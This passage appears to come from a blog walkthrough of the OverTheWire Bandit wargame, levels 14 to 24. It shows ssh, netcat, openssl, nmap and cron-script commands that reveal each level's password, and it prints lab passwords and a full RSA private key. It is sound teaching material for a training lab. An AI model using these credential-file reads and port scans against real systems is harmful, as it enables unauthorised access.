</pre></td><td class='code'><pre><code class=''><span class='line'>ssh bandit14@localhost -i /home/bandit13/sshkey.private
</span><span class='line'>bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
</span><span class='line'>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>ssh — OpenSSH SSH client (remote login program)</p>

<p>-i identity_file
Selects a file from which the identity (private key) for public key authentication is read.</p></blockquote>

<h3>Level 14 &ndash;> Level 15</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.</p>

<p>This level is straightforward since we have netcat available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit14@melinda:~$ nc -v localhost 30000
</span><span class='line'>Connection to localhost 30000 port [tcp/*] succeeded!
</span><span class='line'>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
</span><span class='line'>Correct!
</span><span class='line'>BfMYroe26WYalil77FoDi9qh59eK5xNr</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  It can open TCP connections,
send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.</p></blockquote>

<h3>Level 15 &ndash;> Level 16</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p>

<p>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -quiet and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</p>

<p>For this the <em>openssl</em> command line utility will come in handy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The openssl program is a command line tool for using the various cryptography functions of OpenSSL's crypto library from the shell. It can be used for
</span><span class='line'>
</span><span class='line'>        o  Creation and management of private keys, public keys and parameters
</span><span class='line'>        o  Public key cryptographic operations
</span><span class='line'>        o  Creation of X.509 certificates, CSRs and CRLs
</span><span class='line'>        o  Calculation of Message Digests
</span><span class='line'>        o  Encryption and Decryption with Ciphers
</span><span class='line'>        o  SSL/TLS Client and Server Tests
</span><span class='line'>        o  Handling of S/MIME signed or encrypted mail
</span><span class='line'>        o  Time Stamp requests, generation and verification</span></code></pre></td></tr></table></div></figure>


<p>In particular, we will use the <code>s_client</code> command which is very useful for SSL servers testing and diagnostics. We use it to connect to localhost on the specified port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify error:num=18:self signed certificate
</span><span class='line'>verify return:1
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify return:1
</span><span class='line'>BfMYroe26WYalil77FoDi9qh59eK5xNr
</span><span class='line'>Correct!
</span><span class='line'>cluFn7wTiGryunymYOu4RcffSxQluehd
</span><span class='line'>
</span><span class='line'>read:errno=0</span></code></pre></td></tr></table></div></figure>


<p>Without the <em>-quiet</em> flag we would get a ton of information and instead of the password we would see some HEARTBEATING and read R BLOCK messages</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>openssl &ndash; OpenSSL command line tool</p>

<p>s_client  This implements a generic SSL/TLS client which can establish a transparent connection to a remote server speaking SSL/TLS.
It&rsquo;s intended for testing purposes only and provides only rudimentary interface functionality but internally uses
mostly all functionality of the OpenSSL ssl library.</p>

<p>-connect host:port
This specifies the host and optional port to connect to. If not specified then an attempt is made to connect to the local host on port 4433</p>

<p>-quiet
inhibit printing of session and certificate information. This implicitly turns on -ign_eof as well.</p></blockquote>

<p>More information (along with the CONNECTED COMMANDS section) can be found on <a href="https://openssl.org/docs/apps/s_client.html#options">https://openssl.org/docs/apps/s_client.html#options</a></p>

<h3>Level 16 &ndash;> Level 17</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>

<p>Fortunately, we have nmap installed, so scanning the port range is easy!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit16@melinda:~$ nmap localhost -p31000-32000
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.40 ( http://nmap.org ) at 2015-07-27 13:56 UTC
</span><span class='line'>Nmap scan report for localhost (127.0.0.1)
</span><span class='line'>Host is up (0.00087s latency).
</span><span class='line'>Not shown: 996 closed ports
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>31046/tcp open  unknown
</span><span class='line'>31518/tcp open  unknown
</span><span class='line'>31691/tcp open  unknown
</span><span class='line'>31790/tcp open  unknown
</span><span class='line'>31960/tcp open  unknown
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds</span></code></pre></td></tr></table></div></figure>


<p>Using netcat to probe all those ports, I found out that ports 31518 and 31790 use SSL from the following error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ERROR
</span><span class='line'>140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:</span></code></pre></td></tr></table></div></figure>


<p>The rest of the ports just echo back what you send them. So now let&rsquo;s feed the password to these ports and see which one will give the answer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31518
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify error:num=18:self signed certificate
</span><span class='line'>verify return:1
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify return:1
</span><span class='line'>cluFn7wTiGryunymYOu4RcffSxQluehd
</span><span class='line'>cluFn7wTiGryunymYOu4RcffSxQluehd</span></code></pre></td></tr></table></div></figure>


<p>So, port 31518 just returns the string you give it. Must be the other one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify error:num=18:self signed certificate
</span><span class='line'>verify return:1
</span><span class='line'>depth=0 CN = li190-250.members.linode.com
</span><span class='line'>verify return:1
</span><span class='line'>cluFn7wTiGryunymYOu4RcffSxQluehd
</span><span class='line'>Correct!
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
</span><span class='line'>imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
</span><span class='line'>Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
</span><span class='line'>DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
</span><span class='line'>JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
</span><span class='line'>x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
</span><span class='line'>KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
</span><span class='line'>J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
</span><span class='line'>d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
</span><span class='line'>YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
</span><span class='line'>vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
</span><span class='line'>+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
</span><span class='line'>8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
</span><span class='line'>SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
</span><span class='line'>HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
</span><span class='line'>SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
</span><span class='line'>R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
</span><span class='line'>Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
</span><span class='line'>R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
</span><span class='line'>L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
</span><span class='line'>blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
</span><span class='line'>YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
</span><span class='line'>77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
</span><span class='line'>dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
</span><span class='line'>vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>
</span><span class='line'>read:errno=0</span></code></pre></td></tr></table></div></figure>


<p>Instead of a password we got a SSH private key. I copied it in my <code>.ssh</code> folder, gave it right permissions to stop the WARNING: UNPROTECTED PRIVATE KEY FILE! message, and used it to log in as the next level and get the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/.ssh# chmod 600 bandit17
</span><span class='line'>root@kali:~/.ssh# ssh -i ~/.ssh/bandit17 bandit17@bandit.labs.overthewire.org
</span><span class='line'>bandit17@melinda:~$ cat /etc/bandit_pass/bandit17
</span><span class='line'>xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>nmap &ndash; Network exploration tool and security / port scanner</p>

<p>-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</p></blockquote>

<h3>Level 17 &ndash;> Level 18</h3>

<p>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new</p>

<p>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19</p>

<p>We can use the <em>diff</em> program to see the differences between the 2 files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit17@melinda:~$ ls
</span><span class='line'>passwords.new  passwords.old
</span><span class='line'>bandit17@melinda:~$ diff passwords.old passwords.new 
</span><span class='line'>42c42
</span><span class='line'>&lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
</span><span class='line'>---
</span><span class='line'>&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span></code></pre></td></tr></table></div></figure>


<p>The 42c42 string means that line 42 in the first file was changed to line 42 in the second. diff uses some characters to signify the kind of change that was found:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a – line was added
</span><span class='line'>c – line was changed
</span><span class='line'>d – line was deleted</span></code></pre></td></tr></table></div></figure>


<p>The number to the left of the character represents the line number in the first file, while the one to the right refers to the line number of the second file. So the correct password is kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>diff &ndash; compare files line by line</p></blockquote>

<h3>Level 18 &ndash;> Level 19</h3>

<p>The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.</p>

<p>Upon logging in, we are instantly disconnected and get a bye message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Byebye !
</span><span class='line'>Connection to bandit.labs.overthewire.org closed.</span></code></pre></td></tr></table></div></figure>


<p>The way to run a command immediately after logging in is to add it after the ssh command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/.ssh# ssh bandit18@bandit.labs.overthewire.org cat readme
</span><span class='line'>This is the OverTheWire game server. More information on http://www.overthewire.org/wargames
</span><span class='line'>
</span><span class='line'>Please note that wargame usernames are no longer level&lt;X&gt;, but wargamename&lt;X&gt;
</span><span class='line'>e.g. vortex4, semtex2, ...
</span><span class='line'>
</span><span class='line'>Note: at this moment, blacksun is not available.
</span><span class='line'>
</span><span class='line'>bandit18@bandit.labs.overthewire.org's password: 
</span><span class='line'>IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span></code></pre></td></tr></table></div></figure>


<h3>Level 19 &ndash;> Level 20</h3>

<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used to setuid binary.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Run a command as another user.
</span><span class='line'>  Example: ./bandit20-do id
</span><span class='line'>bandit19@melinda:~$ ls -l bandit20-do 
</span><span class='line'>-rwsr-x--- 1 bandit20 bandit19 7370 Nov 14  2014 bandit20-do</span></code></pre></td></tr></table></div></figure>


<p>The binary is a setuid binary owned by the bandit20 user, which means we can use it to directly read he password as if we were bandit20. No exploitation needed!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
</span><span class='line'>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span></code></pre></td></tr></table></div></figure>


<h3>Level 20 &ndash;> Level 21</h3>

<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>

<p>NOTE: To beat this level, you need to login twice: once to run the setuid command, and once to start a network daemon to which the setuid will connect.</p>

<p>NOTE 2: Try connecting to your own network daemon to see if it works as you think</p>

<p>Here we will need to use 2 connections because we need to set up a listener as well. But since we have netcat, all is well! :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit20@melinda:~$ ./suconnect 
</span><span class='line'>Usage: ./suconnect &lt;portnumber&gt;
</span><span class='line'>This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.</span></code></pre></td></tr></table></div></figure>


<p>Have netcat listen on a port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit20@melinda:~$ nc -vnlp 7777
</span><span class='line'>Listening on [0.0.0.0] (family 0, port 7777)
</span></code></pre></td></tr></table></div></figure>


<p>Then use the setuid program to connect from a new shell to the netcat listener. We see on the netcat side the connection has been received and if we give it the password we will receive the next one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 41986)
</span><span class='line'>GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</span><span class='line'>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span></code></pre></td></tr></table></div></figure>


<p>You can see on the other shell with the setuid binary that the password matched:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit20@melinda:~$ ./suconnect 7777
</span><span class='line'>Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</span><span class='line'>Password matches, sending next password</span></code></pre></td></tr></table></div></figure>


<h3>Level 21 &ndash;> Level 22</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>If we look in <code>/etc/cron.d/</code> we see a bunch of files, we are interested in the cronjob for bandit22:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
</span><span class='line'>* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &&gt; /dev/null</span></code></pre></td></tr></table></div></figure>


<p>So cron runs a shell script as the bandit22 user. Let&rsquo;s see what it is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
</span><span class='line'>cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span></code></pre></td></tr></table></div></figure>


<p>So the bandit22 user decided to paste his password in a random named file in <em>/tmp/</em>, but he gave everyone the permission to read it!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit21@melinda:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
</span><span class='line'>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>cron &ndash; daemon to execute scheduled commands</p>

<p>A crontab file contains instructions to the cron(8) daemon of the general form: &ldquo;run this command at this time on this date&rdquo;. Each user
has their own crontab, and commands in any given crontab will be executed as the user who owns the crontab.</p>

<p>The format of a cron command is very much the V7 standard, with a number of upward-compatible extensions. Each line has five time and
date fields, followed by a command,  followed by a newline character (&lsquo;\n&rsquo;). The system crontab (/etc/crontab) uses the same format,
except that the username for the command is specified after the time and date fields and before the command. The fields may be separated
by spaces or tabs.</p>

<p>Commands  are executed by cron(8) when the minute, hour, and month of year fields match the current time, and when at least one of the two
day fields (day of month, or day of week) match the current time. cron(8) examines cron entries once every minute.</p>

<p>A field may be an asterisk (*), which always stands for &ldquo;first-last&rdquo;.</p></blockquote>

<h3>Level 22 &ndash;> Level 23</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>

<p>Again, we identify the cronjob file first to know where to look further:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23
</span><span class='line'>* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &&gt; /dev/null</span></code></pre></td></tr></table></div></figure>


<p>This script is more involved than the last:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>myname=$(whoami)
</span><span class='line'>mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
</span><span class='line'>
</span><span class='line'>echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
</span><span class='line'>
</span><span class='line'>cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget</span></code></pre></td></tr></table></div></figure>


<p>So, this script assigns the current user name to the myname variable. We know that&rsquo;s bandit22. And then copies the password to a file in <em>/tmp/</em> that we have to identify. We can do this by substitution:</p>

<p>myname=bandit23 (that is what the <em>whoami</em> command will return)</p>

<p>Then the string &ldquo;I m user bandit23&rdquo; is fed to md5sum to compute a MD5 hash. You can check the output on your system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo "I am user bandit23" | md5sum 
</span><span class='line'>8ca319486bfbbc3663ea0fbe81326349  -</span></code></pre></td></tr></table></div></figure>


<p>The cut command is used to print just the hash line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
</span><span class='line'>8ca319486bfbbc3663ea0fbe81326349</span></code></pre></td></tr></table></div></figure>


<p>Now we know that mytarget=8ca319486bfbbc3663ea0fbe81326349</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
</span><span class='line'>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>whoami &ndash; Print the user name associated with the current effective user ID</p>

<p>echo &ndash; display a line of text</p>

<p> md5sum &ndash; compute and check MD5 message digest</p>

<p>cut &ndash; remove sections from each line of files</p>

<p>-d, &mdash;delimiter=DELIM
use DELIM instead of TAB for field delimiter</p>

<p>-f, &mdash;fields=LIST
select only these fields;  also print any line that contains no delimiter character, unless the -s option is specified</p></blockquote>

<h3>Level 23 &ndash;> Level 24</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>

<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>

<p>The beginning is the same as last levels:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
</span><span class='line'>* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &&gt; /dev/null
</span><span class='line'>bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>myname=$(whoami)
</span><span class='line'>
</span><span class='line'>cd /var/spool/$myname
</span><span class='line'>echo "Executing and deleting all scripts in /var/spool/$myname:"
</span><span class='line'>for i in * .*;
</span><span class='line'>do
